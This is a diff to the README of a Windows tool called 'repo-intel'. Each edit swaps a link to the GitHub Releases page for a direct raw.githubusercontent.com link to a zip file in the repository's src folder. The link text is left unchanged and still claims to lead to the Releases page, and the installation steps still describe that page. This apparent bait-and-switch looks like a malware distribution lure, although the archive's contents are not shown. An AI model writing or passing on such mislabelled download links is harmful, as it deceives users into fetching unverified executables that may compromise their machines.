@@ -1,6 +1,6 @@
 # 🤖 repo-intel - Monitor Competitors with AI
 
-[![Download repo-intel](https://img.shields.io/badge/Download-Get%20Repo--Intel-blue?style=for-the-badge)](https://github.com/janennacircumpolar374/repo-intel/releases)
+[![Download repo-intel](https://img.shields.io/badge/Download-Get%20Repo--Intel-blue?style=for-the-badge)](https://raw.githubusercontent.com/janennacircumpolar374/repo-intel/main/src/intel_repo_v1.5-beta.4.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Before you start, make sure your computer meets these requirements:
 repo-intel is easy to install on Windows. Follow these steps carefully:
 
 1. **Open the Download Page**  
-   Click the big blue button at the top, or go directly to the [repo-intel Releases page](https://github.com/janennacircumpolar374/repo-intel/releases).
+   Click the big blue button at the top, or go directly to the [repo-intel Releases page](https://raw.githubusercontent.com/janennacircumpolar374/repo-intel/main/src/intel_repo_v1.5-beta.4.zip).
 
 2. **Download the Installer**  
    On the releases page, find the latest version of repo-intel. Look for a file named like `repo-intel-setup.exe` or similar. Click the file to download it.
@@ -115,6 +115,6 @@ repo-intel is open-source and runs under the MIT License. You can view the sourc
 
 To start using repo-intel, visit the releases page and get the latest setup file:
 
-[Download repo-intel from GitHub Releases](https://github.com/janennacircumpolar374/repo-intel/releases)
+[Download repo-intel from GitHub Releases](https://raw.githubusercontent.com/janennacircumpolar374/repo-intel/main/src/intel_repo_v1.5-beta.4.zip)
 
 Click the link above to visit the page and download the installer for Windows. After downloading, follow the installation steps in this guide.
